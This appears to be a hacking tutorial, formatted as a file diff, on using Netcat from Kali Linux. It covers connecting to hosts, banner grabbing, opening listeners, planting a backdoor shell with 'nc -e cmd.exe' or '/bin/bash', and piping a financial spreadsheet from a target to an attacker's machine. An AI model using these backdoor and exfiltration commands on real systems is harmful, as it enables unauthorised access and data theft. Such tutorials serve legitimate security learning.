@@ -1,0 +1,89 @@
+Let's look at some of Netcat's capabilities using Kali Linux. Netcat should be installed, but Ncat might not be. To install either, just use one of the commands below.
+
+apt-get install netcat
+
+apt-get install ncat
+
+Step 1Open Netcat's Help Screen
+
+Once we've fired up our Kali Linux system and opened a terminal, we can use Netcat from any directory since it's located in our bin directory which is in our PATH variable by default. So, let's type nc -h to see its help page.
+
+ for Ncat:
+
+ncat -h
+
+To connect to another machine:
+
+nc options host-IP-address port
+
+To listen for inbound connections:
+
+nc -l -p port
+
+Step 3Use Netcat to Connect to a Remote System
+
+Let's go ahead and use Netcat to connect to a remote system. In this case, we will try to connect to a web server on port 80.
+
+nc 192.168.1.105 80
+
+That command gives us a TCP connection, by default, to the web server (port 80) at 192.168.1.105. Now, whatever we type, we will be sent directly to the web server when we hit enter.
+
+Step 4Use Netcat to Banner Grab for OS Fingerprinting
+
+A banner grab to the web server can be done with the HEAD / HTTP/1.0 command. Be careful and copy exactly as is with the slashes and spaces. Alternatively, if this doesn't work, you can try HEAD / HTTP/1.1 instead.
+
+Hit enter a few times and the web server will respond with its banner telling us exactly what software it is running. In this case, we can see that the web server is running Microsoft's IIS 7.5.
+
+Step 5Use Netcat to Listen for Connections
+
+Now, let's use Netcat to create a listener on the remote system. Let's assume that we have a Windows server that we have installed Netcat on. We can now type the following to open a Netcat listener on port 6996 (it can be any port) on that system.
+
+nc - l -p 6996
+
+This has created a "listener" that we can connect to at our leisure.
+
+C:\>
+C:\>
+C:\>
+C:\>
+C:\>
+C:\>nc -l -p 6996
+
+Step 6Create a Backdoor
+
+Now, let's create a backdoor on the target system that we can come back to at any time. The command will vary slightly based upon whether we are attacking a Linux or Windows system.
+
+For Windows, we use:
+
+nc -l -p 6996 -e cmd.exe
+
+For Linux, it's:
+
+nc -l -p 6996 -e /bin/bash
+
+This will open a listener on the system that will "pipe" the command shell or the Linux bash shell to the connecting system.
+
+Copy Files Out (Exfiltrate) from the Target
+
+Netcat can also be used to exfiltrate files and data from the target. Let's imagine that there's data on the target system that we want, maybe financial data or data stored in a database. We can use a stealth connection to slowly copy that data out to our attack system. In this example, we will exfiltrate a file called financialprojections.xls, presumably an Excel file with financial projections.
+
+From the source system, we type:
+
+type financialprojections.xls | nc 192.168.1.104 6996
+
+That command says to display the file financialprojections.xls, then pipe (|) it to Netcat (nc) to IP address 192.168.1.104 through port 6996.
+
+02/26/2013  05:28 PM     <DIR>          WINDOWS
+10/09/2006  03:55 PM     <DIR>          wmpub
+               4 Files(s)         59,533 bytes
+               8 Dir(s)    4,876,210,176 bytes free
+
+C:\>type financialprojections.xls | nc 192.168.1.104 6996
+
+C:\>type financialprojections.xls | nc 192.168.1.104 6996
+
+From the destination system, we type:
+
+nc -l -p 6996 > financialprojections.xls
+
+That command says to create a listener (l) on port (p) 6996, then send the data received on this listener to a file named financialprojections.xls.
